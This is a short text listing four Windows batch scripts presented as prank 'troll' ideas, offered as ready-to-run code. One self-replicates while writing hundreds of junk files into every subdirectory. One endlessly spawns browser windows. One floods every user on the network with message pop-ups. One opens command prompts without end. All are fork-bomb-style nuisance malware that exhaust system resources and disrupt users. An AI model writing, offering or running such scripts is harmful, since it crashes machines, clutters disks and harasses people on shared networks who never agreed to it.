idea 1, text file spammer that self-replicates
@echo off
:troll
start nftroll.bat
for /r /d %%a in (*) do (for /l %%b in (1,1,100) do (Echo. > %%a\%%b.%RANDOM%.%RANDOM%.troll)
rem Random number so that multiple windows won't affect it as much.
goto troll
To fix,just del /s *.troll
idea 2, browser opening.
@echo off
:troll
start ietroll.bat
start iexplore http://peacekeeper.futuremark.com/run.action
rem pretty much, opening a million windows of testing
goto troll
idea 3 spam dialogs to network
@echo off
:troll
msg * Troll!
goto troll
idea 4 open command prompt
@echo off
:troll
Start
start cmdtroll.bat
goto troll

